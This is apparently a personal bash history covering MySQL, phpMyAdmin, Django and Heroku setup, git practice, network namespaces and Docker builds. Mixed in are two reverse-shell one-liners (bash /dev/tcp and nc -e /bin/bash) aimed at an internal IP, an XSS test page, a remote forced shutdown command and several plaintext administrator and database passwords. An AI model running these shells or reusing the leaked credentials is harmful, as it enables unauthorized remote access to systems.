python manage.py runserver 10.134.196.21:8000
ll /data/
mkdir /data/software
cd /data/software
wget http://dev.mysql.com/get/Downloads/MySQL-5.7/mysql-5.7.17-linux-glibc2.5-x86_64.tar.gz
mkdir /data/mysql
ll
cd ..
ll
ls /data
cd software/
tar -xzvf mysql-5.7.17-linux-glibc2.5-x86_64.tar.gz 
ll
mv mysql-5.7.17-linux-glibc2.5-x86_64 /usr/local/mysql
cd ..
useradd -r -s /sbin/nologin -g mysql mysql -d /usr/local/mysql
groupadd mysql
useradd -r -s /sbin/nologin -g mysql mysql -d /usr/local/mysql
cd /usr/local/mysql/
pwd
chown -R mysql .
chgrp -R mysql .
chown -R mysql /data/mysql
bin/mysqld --initialize --user=mysql --basedir=/usr/local/mysql --datadir=/data/mysql
bin/mysql_ssl_rsa_setup  --datadir=/data/mysql
cd /usr/local/mysql/support-files/
ls
cp my-default.cnf  /etc/my.conf
cp mysql.server  /etc/init.d/mysql
vim /etc/init.d/mysql 
/etc/init.d/mysql start
ll /usr/local/mysql/
ll /data/mysql/
vim /etc/my.c
vim /etc/my.conf 
less PTY.localdomain.err
less PTY.PTY.err
vim /etc/hosts
less localhost.localdomain.err
vim /etc/sysconfig/network
vim /etc/my.conf 
top
top |grep mysql
kill -9 mysql_safe
kill -9 mysqld
ssh root@10.148.52.1
ssh root@10.134.99.234
ssh root@10.134.99.224
ssh root@10.134.99.226
cd
mkdir /home/phpmyadmin
cd /home/phpmyadmin/
 wget https://files.phpmyadmin.net/phpMyAdmin/4.8.3/phpMyAdmin-4.8.3-all-languages.zip
unzip phpMyAdmin-4.8.3-all-languages.zip 
cp -r phpMyAdmin-4.8.3-all-languages/* /home/phpmyadmin
ps aux |grep httpd
vim /etc/httpd/conf
vim /etc/httpd/conf/httpd.conf
systemctl restart apache
systemctl restart httpd
vim /etc/httpd/conf.d/php.conf 
systemctl restart httpd
vim /etc/httpd/conf/httpd.conf
systemctl restart httpd
journalectl -xe
journalctl -xe
vim /etc/httpd/conf.d/php.conf 
systemctl restart httpd
journalctl -xe
vim /etc/httpd/conf.d/php.conf 
systemctl restart httpd
ip/phpmyadmin
systemctl restart httpd
vim /etc/httpd/conf.d/php.conf 
systemctl restart httpd
journalctl -xe
systemctl restart httpd
journalctl -xe
vim /etc/httpd/conf.d/php.conf 
systemctl restart httpd
yum install phpmyadmin php-mcrypt
vim /etc/httpd/conf.d/phpMyAdmin.conf
systemctl restart httpd
cd Envs/spider/
workon spider
vim learning_logs/views.py 
rm learning_logs/views.py 
vim learning_logs/views.py 
vim learning_logs/models.py 
vim learning_logs/views.py 
date
vim learning_logs/views.py 
vim learning_django/settings.py 
vim learning_logs/models.py 
vim learning_logs/views.py 
vim learning_logs/templates/learning_logs/edit_entry.html 
vim learning_logs/templates/learning_logs/base.html 
vim learning_logs/templates/learning_logs/index.html 
vim learning_logs/models.py 
vim learning_logs/views.py 
vim learning_django/settings.py 
vim learning_logs/views.py 
rm learning_logs/views.py 
vim learning_logs/views.py 
pip install django-bootstrap3
vim learning_django/settings.py 
vim learning_logs/templates/learning_logs/base.html 
mv learning_logs/templates/learning_logs/base.html learning_logs/templates/learning_logs/base.html.bak
ll learning_logs/templates/learning_logs/base.html 
vim learning_logs/templates/learning_logs/base.html 
userdel -r mysql
cat /etc/passwd
cat /etc/group
ssh root@10.134.99.246
less /var/log/mariadb/mariadb.log
ll /var/lib/mysql/PTY.pid
cd /var/log
ll marria
mkdir mariadb
touch mariadb/mariadb.log
ll mariadb/
/etc/init.d/mysql start
mkdir -p /data/log/mysql
ls /dat
ls /data/
ll /usr/local/mysql/
mkdir -p /var/lib/mysql
/etc/init.d/mysql start
ll /var/lib/mysql
ll /var/lib/mysql/
touch  /var/lib/mysql/PTY.pid
/etc/init.d/mysql start

touch  /var/lib/mysql/PTY.pid
ll  /var/lib/mysql/PTY.pid
chown mysql:mysql -R  /var/lib/mysql//PTY.pid 
chown mysql:mysql -R  /var/lib/mysql/
chown mysql:mysql -R  /var/lib/mysql/PTY.pid 
ll  /var/lib/mysql/PTY.pid
ll  /var/lib/mysql
/etc/init.d/mysql start
vim /etc/my.c
vim /etc/my.conf
/etc/init.d/mysql start
locate mysql-bin.index
cd 
locate mysql-bin.index
rpm -qa |grep postfix
cd /etc/init.d
rm mysql 
rm /etc/my.conf 
rm -r /data/mysql
rm -rf /data/mysql
rm -rf /usr/local/mysql
ll /usr/local/mysql
cd
rpm -Uvh https://repo.mysql.com//mysql57-community-release-el7-11.noarch.rpm
yum repolist enable |grep "mysql.*-community.*"
yum repolist enabled |grep "mysql.*-community.*"
rm -rf /var/lib/mysql/
cat /etc/group
cat /etc/group |grep mysql
yum install -y mysql-community-server
systemctl start mysql
systemctl start mysqld
grep "temporary password" /var/log/mysqld.log 
mysql_secure_installation 
mysql -u root -h localhost -p
yum install php70w.x86_64 php70w-cli.x86_64 php70w-common.x86_64 php70w-gd.x86_64 php70w-ldap.x86_64 php70w-mbstring.x86_64 php70w-mcrypt.x86_64 php70w-mysql.x86_64 php70w-pdo.x86_64
————————————————
版权声明：本文为CSDN博主「滑冰选手斯蒂芬」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。
rpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm
yum search php70w
yum install php70w php70w-fpm php70w-cli php70w-common php70w-devel php70w-gd php70w-pdo php70w-mysql php70w-mbstring php70w-bcmath
php -v
systemctl start php-fpm.
systemctl start php-fpm
systemctl status httpd
cd Envs/spider/
workon spider
curl https://cli-assets.heroku.com/install.sh | sh
pip install dj-database-url
pip install --upgrade pip
pip install dj-static static3 gunicorn
pip freeze >requirements.txt
ll
vim requirements.txt 
pip install psycopg2 -y
pip install psycopg2 
yum install postgresql-devel*
pip install psycopg2 
python --version
vim runtime.txt
vim learning_django/settings.py 
vim Procfile
vim learning_django/wsgi.py 
ll learning_django/
mkdir learning_django/static
vim learning_django/static/placeholder.txt
heroku local
git --version
git config --global user.name "ehmatthes"
git config --global user.email "eric@example.com
"
vim .gitignore
l
ll
ll learning_django/
git init
git add .
git commit -am "ready for deployment to hreoku."
git status
heroku login
hr
vim /etc/profile
source /etc/profile
pip install -r requirements.txt 
ping www.baidu.com
pip install -r requirements.txt 
ping 10.134.99.64
pip install -r requirements.txt 
pip install --upgrade pip
pip -v
pip --version
ping 10.134.99.51
heroku login
cd Envs/spider/
workon spider
heroku login
vim /etc/profile
vim ~/.bash_profile 
source ~/.bash_profile 
workon spider
cd Envs/spider/
python manage.py runserver 10.134.196.21:8000
vim learning_django/settings.py 
heroku login
vim /etc/profile
source /etc/profile
heroku login
heroku local
heroku update
heroku login
heroku login -i
visit https://cli-auth.heroku.com/auth/browser/8ca556d1-1c53-4a1e-956c-5a05d890864c
curl https://cli-auth.heroku.com/auth/browser/8ca556d1-1c53-4a1e-956c-5a05d890864c
yum install -y firefox
heroku login
heroku login -i
cd Envs/spider/
workon spider
vim learning_logs/templates/learning_logs/base.html
vim learning_logs/templates/learning_logs/index.html 
vim users/templates/users/login.html 
vim learning_logs/templates/learning_logs/base.html
vim learning_logs/templates/learning_logs/new_topic.html 
vim learning_logs/templates/learning_logs/topics.html 
vim learning_logs/templates/learning_logs/topic.html 
vim learning_logs/templates/learning_logs/new_entry.html 
vim learning_logs/templates/learning_logs/edit_entry.html 
pip show herokku
pip show heroku
cd /usr/local
ll
cd bin/
ll heroku 
locate heroku
locate heroku/bin
ping 10.134.99.45
cd Envs/spider/
workon spider
heroku login -i
heroku create
git push heroku master
heroku ps
heroku open
heroku open -i
heroku open --help
heroku run python manage.py migrate
heroku login -i
heroku ps
heroku open
heroku run python manage.py migrate
heroku run bash
git status
curl http://webchat.freenode.net/
mkdir git_practice
cd git_practice/
git config --global user.name "git01"
git config --global user.email "git01@example.com"
git init
vim .gitignore
git init
git status
ll
git add .
git status
git commit -m "Started project."
git status
vim hello_world.py
git commit -m "Started project."
git status
git add .
git status
git commit -m "start project."
git status
vim hello_world.py 
git status
git commit -am "Extended greeting."
git status
git log --pretty=oneline
vim hello_world.py 
gitstatus
git status
git checkout .
git status
vim hello_world.py 
git log --pretty=oneline
git checkout d6d53
git checkout master
git status
git log --pretty=oneline
git reset --hard d6d53
git status
git log pretty=oneline
git log --pretty=oneline
git status
ll
ll .git
rm -rf .git
git status
git init
git status
rm -rf .git
ll
git status
git init
git status
git add .
git commit -m "Start project."
git status
wget https://github.com/apachecn/python_data_analysis_and_mining_action/blob/master/Python%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E4%B8%8E%E6%8C%96%E6%8E%98%E5%AE%9E%E6%88%98.pdf
ll 
ll -,
ll -m
history
tcpdump -i eht0 -v -nn host '8.8.8.8'
ip a
tcpdump -i ens160 -v -nn host '8.8.8.8'

tcpdump -i ens160 -v -nn host '8.8.8.8'
ping 10.150.4.127
yum -y install zabbix-server-mysql zabbix-web-mysql
rpm -ivh  http://repo.zabbix.com/zabbix/3.2/rhel/7/x86_64/zabbix-release-3.2-1.el7.noarch.rpm
rpm --import /etc/pki/rpm-gpg/RPM-GPG-KEY-ZABBIX
yum -y install zabbix-server-mysql zabbix-web-mysql
vim /etc/profile
systemctl mysqld
systemctl start mysqld
mysql_secure_installation
mysql -uroot -p123456
mysql -uroot -pFoxconn99~
rpm -qa|grep httpd
rpm -qa|grep mariadb
systemctl start mariadb
ll
rpm -qa |grep zabbix
python --version
cat /etc/redhat-release 
yum list
p
python
python3
pyhton
python
cd anaconda2
ll
bash ./Anaconda2-5.2.0-Linux-x86_64.sh 
ll
mkdir anaconda2
cd anaconda
cd anaconda2/
 bash Anaconda2-5.0.0.1-Linux-x86_64.sh 
wget https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/Anaconda2-5.2.0-Linux-x86_64.sh
tcpdump -i ens160 -v -nn host '8.8.8.8'
tcpdump -i ens160 -v -nn host '10.134.196.22'
id
whoami
timezone
bash -i >& /dev/tcp/10.134.196.22/8080 0>&1
nc 10.134.196.22 4050 -t -e /bin/bash
ad 
snort
cat /etc/models
ssh root@10.150.7.20
apache --version
rpm -qa|grep httpd
vim /var/www/html/xss1.html
scp root@10.150.7.55:/var/www/html/testdom.html /var/www/html/xss1.html 
vim /var/www/html/xss1.html
systemctl status httpd
systemctl restart httpd
vim /etc/httpd/conf/httpd.conf
systemctl restart httpd
vim /etc/httpd/conf/httpd.conf
service restart httpd
systemctl restart httpd
vim /etc/httpd/conf/httpd.conf
systemctl restart httpd
vim /etc/httpd/conf/httpd.conf
systemctl restart httpd
ll
ll /public/
vim regular_express.txt 
clear
cd Envs/spider/
ll
cd ..
ll
cd spider/
workon spider
python runserver 10.134.196.21:8000
python manage.py runserver 10.134.196.21:8000
history
history|grep git
php info
php --help
php test.php 
vim test.php
php test.php 
vim test.php
ssh root@10.150.7.55
vim /var/www/html/xss1.html 
systemctl restart httpd
ip a
vim /etc/httpd/conf/ht
ll /var/www/html/
vim /etc/httpd/conf/httpd.conf
php --info
vim /var/www/html/test1.php
journal -xe|tail -20
journalctl -xe|tail -20
cat /var/log/httpd/access_log
docker inspect b1
docker start -ia b1
docker exec -it b1 /bin/sh
docker commit  -p b1 
docker image ls
docker tag --help
docker tag d68e6feafbbc mageedu/bbox_httpd
docker tag d68e6feafbbc mageedu/bbox_httpd:v0.1-1
docker image ls
docker tag mageedu/bbox_httpd:v0.1-1 mageedu/bbox_httpd:latest2
docker image ls
docker image rm mageedu/httpd:latest
docker image rm mageedu/bbox_httpd:latest
docker image ls
docker inspect busybox
docker inspect nginx:1.14-alpine
docker image ls
docker inspect mageedu/bbox_httpd:v0.1-1
docker run --name t1 -it mageedu/bbox_httpd:v0.1-1
docker commit --help
docker commit -a "mageedu <mageedu.com>" -c 'CMD ["/bin/httpd","-f","-h","/data/html"]' -p b1 mageedu/httpd:v0.2
docker imagels
docker image ls
docker run --name t2  mageedu/httpd:v0.2
:
history
brctl show
ip l s
ip link show
brctl show
clear
iptables -t nat -vnl
iptables -t nat -vnL
docker inspect web1
docker container inspect web1
docker container inspect b1
docker container inspect t1
ip
ip netns --help
ip netns 
ip a
ip netns help
ip netns add r1
ip netns add r2
ip netns list
ip netns exec r1 ifconfig
ip netns exec r1 ifconfig -a
ip netns exec r2 ifconfig -a
ip link help
ip link add name veth1.1 type veth peer name veth1.2
ip link show
ifconfig
ip a
ip link sett dev veth1.2 netns r1
ip link set dev veth1.2 netns r1
ip link show
ip netns exec r1 ifconfig -a
ip netns exec r1 link set dev veth1.2 name eth0
ip netns exec r1 ip  link set dev veth1.2 name eth0
ip netns exec r1 ifconfig -a
ifconfig veth1.1 10.1.0.1/24 up
ifconfig
ip netns exec r1 ifconfig eth0 10.1.0.2/24 up
ip netns exec r1 ifconfig
ping 10.1.0.2
ip link set dev veth1.1 netns r2
ifconfig
ip netns exec r2 ifconfig
ip netns exec r2 ifconfig -a
ip netns exec r2 ifconfig veth 1.1 10.1.0.3/24 up
ip netns exec r2 ifconfig veth1.1 10.1.0.3/24 up
ip netns exec r2 ifconfig -a
ip netns exec r2 ping 10.1.0.2
 history
ip netns exec r2 ping 10.1.0.2
ping 172.17.0.2
docker ps -a
docker inspect t1
ping 172.17.0.3
uname -r
 cd /etc/yum.repos.d/
ll
wget https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/centos/docker-ce.repo
ls docker-ce.repo 
vim docker-ce.repo 
yum repolist
yum install docker-ce
vim /etc/docker/daemon.json
cd
mkdir /etc/docker
vim /etc/docker/daemon.json
systemckl start docker
systemctl start docker
docker
docker container --help
docker version
docker info
clear
docker pull nginx:1.14-alpine
vim /etc/docker/daemon.json 
docker search ngin
docker search nginx
vim /etc/profile
vim ~/.bash_profile 
vim /etc/yum.conf 
rm /etc/docker/
rm /etc/docker/daemon.json 
docker search nginx
systemctl restart docker
docker search nginx
vim /etc/docker/daemon.json
systemctl restart  docker
docker search nginx
vim /etc/docker/daemon.json
systemctl restart  docker
docker search nginx
vim /etc/docker/daemon.json
docker search nginx
systemctl restart  docker
docker search nginx
vim /etc/docker/daemon.json
systemctl restart  docker
docker search nginx
systemctl daemon-reload
systemctl restart docker
docker search nginx
vim /etc/docker/daemon.json
systemctl restart docker
docker search nginx
 systemctl daemon-reload
 systemctl restart docker
docker search nginx
vim /etc/docker/daemon.json
 systemctl daemon-reload
 systemctl restart docker
docker search nginx
vim /etc/docker/daemon.json
docker info
curl https://index.docker.io/v1/
vim /etc/resolv.conf 
vim /etc/docker/daemon.json
cd /etc/docker/
mv daemon.json daemon.json.bak
ll
vim daemon.json
service docker restart
docker search redis
docker search centos
ip a
cd /etc/yum.repos.d/
ll
vim docker-ce.repo 
cd
docker info
mkdir -p /etc/systemd/system/docker.service.d
cat  > /etc/systemd/system/docker.service.d/https-proxy.conf <<EOF
[Service]
nment
EOF

vim /etc/systemd/system/docker.service.d/https-proxy.conf 
systemctl daemon-reload
systemctl restart docker
systemctl show --property=Environment docke
systemctl show --property=Environment docker
docker info
docker search nginx
vim /etc/systemd/system/docker.service.d/https-proxy.conf 
systemctl daemon-reload
systemctl restart docker
docker info
docker search nginx
vim /etc/systemd/system/docker.service.d/https-proxy.conf 
systemctl daemon-reload
systemctl restart docker
docker info
docker search nginx
docker pull nginx
history
vim /etc/systemd/system/docker.service.d/https-proxy.conf 
systemctl daemon-reload
systemctl restart docker
docker search nginx
 docker pull nginx:1.14-alpine
docker image ls
docker image pull busybox:latest
docker image ls
docker ps
docker ps -a
docker image ls
docker image ls --help
docker image ls --no-trunc
docker container --help
docker ps
docker container ls
docker run --help
docker network
docker network ls
ip a
docker run --name b1 -it busybox:latest
docker ps -a
docker exec -it b1
docker exec -it b1 /bin/sh
docker ps -a
docker start b1
docker exec --help
docker exec -it b1 /bin/sh
docker ps -a
docker stop b1
docker ps -a
docker start b1
docker ps -a
docker exec -it b1 
docker exec -it b1  /bin/sh
docker container ls
docker start --htlp
docker start --help
docker start -ai b1
history
docker ps
docker inspect web1
curl 172.17.0.2
curl 127.0.0.1
docker ps -a
env
unset http_proxy
unset https_proxy
env
docker ps -a
docker inspect web1 |grep 80
docker inspect web1 |grep IP
curl 172.17.0.2
source /etc/profile
env
unset http_proxy
unset https_proxy
curl 172.17.0.2
curl 172.17.0.3
curl 10.134.196.2
curl 172.17.0.2
 curl 172.17.0.3
hsitory
history
vim /etc/hosts
ls
scp cat.sh docker02:/root/
source /etc/hosts
nslookup -type=A www.baidu.com
ping www.baidu.com
wget - -q info
wget
wget --help
cat /var/spool/mail/root
docker run --help
ps
ps aux
docker ps
docker inspect b1
curl 172.17.0.2
docker ps
docker inspect b1
curl 172.17.0.2
docker ps 
docker inspect b1
curl 172.17.0.2
docker ps
docker kill b1
docker ps -a
docker rm b1
docker ps -a
clear
docker run --name web1 -d nginx:1.14-alpine
dockere ps
docker ps
docker ps -a
history
docker info
docker ps -a
docker container ls
docker image ls --no-trunc
docker ps --help
docker ps --no-trunc
docker inspect b1
curl 172.17.0.3
docker network ls
docker exec -it b1 /bin/sh
docker inspect
docker inspect b1
docker network ls
curl 10.134.196.21:80
docker inspect b1
curl 172.17.0.2
docker ps -a
dokcer start web1
docker start web1
docker ps -a
docker inspect web1
curl 172.17.0.2
curl -k 172.17.0.2
curl 172.17.0.2
env
docker run --name kvstor1 -d redis:3.3-alpine
docker run --name kvstor1 -d redis:3.4-alpine
docker run --name kvstor1 -d redis:4-alpine
docker search redis:4-alpine
docker run --name kvstor1 -d redis:4-alpine
docker ps
docker exec --help
docker exec -it kvstor1 /bin/sh
docker logs
docker logsweb1
docker logs web1
docker pull quay.io/coreos/flannel:v0.10.0-amd64
docker image ls
docker ps
docker stop dd16560ac9b4 
docker stop web1
docker ps
docker ps -a
clear
docker run --name b1 -it busybox 
vim docker-ce.repo
cd /etc/yum.re
cd /etc/yum.repos.d/
vim docker-ce.repo
vim /etc/docker/daemon.json
history
docker ps -a
docekr stop t2
docker stop t2
docker network ls
ipa 
ip a
yum -y install bridge-utils
docker ps -a
docker start t1
docker exec -it t1 /bin/sh
docker ps -a
systemctl start docker
docker ps -a
history
systemctl enable docker
docker
docker ps -a
docker -H 10.150.7.55:2375 ps
cat /var/spool/mail/r
cat /var/spool/mail/root 
ll ./.ssh/
vim ./.ssh/authorized_keys 
systemctl status docker
docker -H 10.150.7.55:2375 ps
env
unset http_proxy
unset https_proxy
docker -H 10.150.7.55:2375 ps
systemctl status docker
ss -tnl
vim /etc/systemd/system/multi-user.target.wants/docker.service 
ls 
vim /etc/systemd/system/multi-user.target.wants/docker.service 
ls
ls /
fdisk -l
du /data
dd /data
df -hY /data
df -hT /data
df -hT 
du --help
yum -y install ntfs-3g
fdisk -l
mkdir /mnt/winD -p
mount -t cifs -o username=Administrator,password=Datacenter@2019@88 10.148.52.202/shellcode /mnt/winD
mount -t cifs -o username=Administrator,password=Datacenter@2019@88 10.148.52.202:/d/shellcode /mnt/winD
scp administrator@10.148.52.202:/d/shellcode/1.txt .
mount_sambafs -l 10.148.52.202 -N //administrator@F3235294-PC/shellcode /mnt/winD
mount --help
mount -o administrator@10.148.52.202:/d/shellcode /mnt/winD
mount -t  cifs -o  administrator@10.148.52.202:/d/shellcode /mnt/winD
mount -t cifs -o username=administrator 10.148.52.202:/d/shellcode /mnt/winD
mount -t cifs -o username=administrator password=Datacenter@2019@88 //10.148.52.202/shellcode /mnt/winD
mount(8)
man mount
df -h
mount -t cifs -o username=administrator password=Datacenter@2019@88 //10.148.52.202/shellcode /mnt/winD
# mount -t cifs -o username=Administrator,password=Datacenter@2019@88  //10.148.52.202/shellcode/  /mnt/winD/
df -h
#mount
mount
cd /mnt/winD/
ll
# mount -t cifs -o username=Administrator,password=Datacenter@2019@88  //10.148.52.202/shellcode/  /mnt/winD/
echo $?
echo $$
echo ??
echo $#
mount
df -h
cd
mount -t cifs -o username=administrator,password=Datacenter@2019@88 //10.148.52.202/shellcode /mnt/
df -h
cd /mnt/shellcode\ \(F3235294-PC\)\ -\ 捷徑.lnk 
cd /mnt/
ll
cd linux-c
ll
cd
history
echo $history
echo $HISTSIZE
vim /etc/profile
source /etc/profile
echo $HISTSIZE
git status
git
git config --global user.name "pty"
git config --global user.email "pty.com"
git init
git status
mkdir git
mv ../.git .
mv ./.git ./git
ll .*
cd git
ll
cd
git status
ll ./git/
cd /gi
cd ./git/
git status
vim hello.py
git status
git commit -m "first commit"
git add .
git status
git commit -m "first commit"
git status
git log
git log --pretty=oneline
vim hello.py 
git status
git commit -am "sec commit"
git log
git status
vim hello.py 
git checkout .
git status
vim hello.py 
git log --pretty=oneline
git checkout a25ad3
vim hello.py 
git checkout master
git status
git log --pretty=oneline
git reset   --hard=a25a37
git reset   --hard a25a37
git reset   --hard a25ad3
git status
git log --pretty=oneline
rm -rf .git/
git status
git init
git status
git add .
cd
ll . |grep *.sh$
ll . |grep *.sh
ll .sh
ll *.sh
ll . 
cp $(ll *.sh) ./git 
cp --help
ll *.sh |cp -v -t ./git
cp `ll *.sh` -t ./git
`ll *.sh`
ls `ll *.sh`
ls $(ll *.sh)
grep $(ll *.sh)
find --help
find . -name *.sh
find . /name *.sh
man find
grep -rn ".sh" 
grep -rn ".sh" *
find -type -name '*.sh' | xargs cp -t ./git
find -type -name '*.sh' 
find -type f -name '*.sh' 
find .  -type f -name '*.sh' 
ls  -al . *.sh
ls  -al  *.sh|xargs grep 'slee'
ls  -al  *.sh|ls
ls  -al  *.sh |grep 'sleep'
ls  -al  *.sh |cp  -t ./git
ls -al test
cd test
mkdir ./test
ll sleep500.sh 
mkdir ./test02
ll *.sh |xargs -i cp {} ./test02/
ls -al *.sh |xargs -i cp {} ./test02/
a=`ls -al *.sh`
cp $a /test02

sudo cp $a /test02
which cp
cp --help
ll *.sh |xargs -I {} cp -r {}
ls -al *.sh |xargs -I {} cp -r {}
find ./zip -type -f -name "*.sh" |xargs -i cp {} ./test02
find ./zip -type f -name "*.sh" |xargs -i cp {} ./test02
ll
cd
env
rmmod --help
man rmmod
vim /etc/docker/daemon.json
net rpc shutdown -r -f -I 10.148.55.218 -U administrator%Foxconn99
yum list --all|grep net-tools
yum list all|grep net-tools
ll *.sh
vim cat.sh 
ll
df -h
history
cp ~/.bash_history /mnt/linux-c/
vim /etc/profile
vim kk.sh
vim /etc/bashrc 
source /etc/bashrc 
vim
chmod +x kk.sh 
vim kk.sh
vim
vim /etc/bashrc 
vi /etc/bashrc 
ll
ll kk.sh 
vim testcap.sh 
ll kk.sh 
source /etc/profile
vim testcap.sh 
ll kk.sh 
source /etc/bashrc 
vim testcap.sh 
ll kk*
vi /etc/bashrc 
source /etc/bashrc 
ll
vim iptables.sh 
reboot
ll
rm -rf test.log test.php 
ll test*
ll /mnt/linux-c/
cp /root/ /mnt/linux-c/
cp -R /root/ /mnt/linux-c/
echo $HISTSIZE
vim ~/.bashrc 
source ~/.bashrc 
source ~/.bash_profile 
vim ~/.bash_profile 
ll
du -sh /root
vim ~/.bashrc 
source ~/.bashrc 
 history |grep docker
docker exec --help
vim ~/.bashrc 
source ~/.bashrc
history
echo $HISTSIZE
docker ps 
docker exec -it tinyweb2 /bin/sh
docker stop tinyweb2
jobs
kill %1
jobs
docker kill tinyweb2
docker inspect tinyhttpd:v0.2-6
cd img2/
vim Dockerfile 
docker inspect tinyhttpd:v0.2-6
docker inspect tinyhttpd:v0.2-7
vim Dockerfile 
类似
ls
docker image ls
docker
docker container --help
echo ${name:-tk}
name=jekk
echo ${name:+tk}
echo $name
echo ${name:-tk}
echo ${name:+tk}
echo ${nam:+tk}
nam=sss
echo ${nam:+t}
type(name)
alias p
cat /var/spool/mail/root
mkdir img1
cd img1/
vim Dockerfile
vim index.html
docker bulid -h
docker build -h
docker build ./ -t tinyhttpd:v0.1-1
docker login
docker ps -a
docker image ls
docker build ./ -t tinyhttpd:v0.1-1
vim Dockerfile 
docker build ./ -t tinyhttpd:v0.1-1
docker image ls
docker run --name tinyweb1 --rm tinyhttpd:v0.1-1 cat /data/web/html/index.html
clear
ls
cp -r /etc/yum.repos.d/ ./
ls
ls yum.repos.d/
vim Dockerfile 
docker build -t tinyhttpd:v0.1-2 ./
docker run --name tinyweb1 --rm tinyhttpd:v0.1-2 ls /etc/yum.repos.d/
vim Dockerfile 
docker build -t tinyhttpd:v0.1-3 ./
docker run --name tinyweb1 --rm tinyhttpd:v0.1-3 ls /usr/local/src
wget http://nginx.org/download/nginx-1.15.2.tar.gz
ls
vim Dockerfile 
docker build -t tinyhttpd:v0.1-4 ./
docker run --name tinyweb1 --rm tinyhttpd:v0.1-4 ls /usr/local/src
docker run --name tinyweb1 --rm tinyhttpd:v0.1-4 ls /usr/local/src/nginx-1.15.2
vim Dockerfile 
docker build -t tinyhttpd:v0.1-5 ./
docker run --name tinyweb1 --rm tinyhttpd:v0.1-5 mount 
docker run --name tinyweb1 --rm tinyhttpd:v0.1-5 sleep 60
vim Dockerfile 
docker build -t tinyhttpd:v0.1-6 ./
docker run --name tinyweb1 --rm tinyhttpd:v0.1-6 /bin/httpd  -f -h /data/web/html
docker run --name tinyweb1 --rm -P tinyhttpd:v0.1-6 /bin/httpd  -f -h /data/web/html
docker build -t tinyhttpd:v0.1-7 ./
vim Dockerfile 
docker build -t tinyhttpd:v0.1-7 ./
vim Dockerfile 
docker build -t tinyhttpd:v0.1-7 ./
ls
vim Dockerfile 
docker build -t tinyhttpd:v0.1-8 ./
vim Dockerfile 
cd /usr/local
ll nginx
ll nginx*
vim Dockerfile 
cd 
cd img1/
docker build -t tinyhttpd:v0.1-8 ./
vim Dockerfile 
docker build -t tinyhttpd:v0.1-7 ./
vim Dockerfile 
docker build -t tinyhttpd:v0.1-7 ./
vim Dockerfile 
docker build -t tinyhttpd:v0.2-7 ./
ls
ll
docker build -t tinyhttpd:v0.2-7 ./
docker image ls
ll
docker run --name tinyweb1 --rm -P tinyhttpd:v0.2-7 ls /usr/local/src/
docker run --name tinyweb1 --rm -P tinyhttpd:v0.2-7 ls /usr/local/src/nginx-1.15.2
docker run --name tinyweb1 --rm -P tinyhttpd:v0.2-7 ls /data/web/html
docker run --help
docker build -h
docker run --name tinyweb1 --rm -P tinyhttpd:v0.2-7 printenv
docker run --name tinyweb1 --rm -P -e WEB_SERVER_PACKAGE="nginx-1.15.1" tinyhttpd:v0.2-7 printenv
docker run --name tinyweb1 --rm -P -e WEB_SERVER_PACKAGE="nginx-1.15.1" tinyhttpd:v0.2-7 printenv && ls /usr/local/src
docker run --name tinyweb1 --rm -P -e WEB_SERVER_PACKAGE="nginx-1.15.1" tinyhttpd:v0.2.7 ls /usr/local/src
docker run --name tinyweb1 --rm -P -e WEB_SERVER_PACKAGE="nginx-1.15.1" tinyhttpd:v0.2-7 ls /usr/local/src
vim Dockerfile 
docker build -t tinyhttpd:v0.1-8 ./
docker run --name tinyweb1 --rm -P -e WEB_SERVER_PACKAGE="nginx-1.15.1" tinyhttpd:v0.1-7 
docker ps -a
docker run --name tinyweb1 --rm -P -e WEB_SERVER_PACKAGE="nginx-1.15.1" -it tinyhttpd:v0.1-7 
vim Dockerfile 
docker build -t tinyhttpd:v0.1-8 ./
docker run --name tinyweb1 --rm -P -e WEB_SERVER_PACKAGE="nginx-1.15.1" -it tinyhttpd:v0.1-8 
docker ps -a
vim Dockerfile 
docker build -t tinyhttpd:v0.1-9 ./
docker ps -a
docker run --name tinyweb1 --rm -P -e WEB_SERVER_PACKAGE="nginx-1.15.1" -it tinyhttpd:v0.1-9 ls /usr/local/src 
 cd
mkdir img2
cd  img2/
vim Dockerfile
docker build -t tinyhttpd:v0.2-1 ./
vim Dockerfile
docker build -t tinyhttpd:v0.2-1 ./
vim Dockerfile
docker build -t tinyhttpd:v0.2-1 ./
clear
docker image inspect tinyhttpd:v0.2-1
docker run --name tinyweb2 -it --rm -P tinyhttpd:v0.2-1
vim Dockerfile 
docker build -t tinyhttpd:v0.2-2 ./
docker image inspect tinyhttpd:v0.2-2
vim Dockerfile 
docker build -t tinyhttpd:v0.2-2 ./
docker image inspect tinyhttpd:v0.2-2
docker run --name tinyweb2 -it --rm -P tinyhttpd:v0.2-1
docker run --name tinyweb2 -it --rm -P tinyhttpd:v0.2-2
vim Dockerfile 
docker build -t tinyhttpd:v0.2-3 ./
docker rm tinyweb2
docker run --name tinyweb2 -it --rm -P tinyhttpd:v0.2-3
vim Dockerfile 
docker build -t tinyhttpd:v0.2-3 ./
docker run --name tinyweb2 -it --rm -P tinyhttpd:v0.2-3
docker ps -a
docker run --name tinyweb2 -it -P tinyhttpd:v0.2-3
docker ps -a
vim D
vim Dockerfile 
docker log tinyweb2
docker kill tinyweb2
docker logs tinyweb2
vim Dockerfile 
docker build -t tinyhttpd:v0.2-4 ./
docker rm tinyweb2
docker run --name tinyweb2 -it -P -- rm  tinyhttpd:v0.2-4
docker run --name tinyweb2 -it -P --rm  tinyhttpd:v0.2-4
docker ps -a
vim Dockerfile 
docker run --name tinyweb2 -it -P --rm  tinyhttpd:v0.2-4 
vim Dockerfile 
docker build -t tinyhttpd:v0.2-5 ./
docker run --name tinyweb2 -it --rm -P tinyhttpd:v0.2-5
docker run --name tinyweb2 -it --rm -P tinyhttpd:v0.2-5 ls /data/web/html
 docker run -h
 docker run --help
docker run --name tinyweb2 -it --rm -P --entrypoint "ls /data" tinyhttpd:v0.2-5 
docker run --name tinyweb2 -it --rm -P --entrypoint "/bin/ls /" tinyhttpd:v0.2-5 
vim Dockerfile 
docker build -t tinyhttpd:v0.2-6 ./
docker build -t tinyhttpd:v0.2-7 ./
docker run --name tinyweb2 -it --rm -P tinyhttpd:v0.2-7
docker run 
docker run --name tinyweb2 -it  -P tinyhttpd:v0.2-7
docker ps -a
docker rm tinyweb2
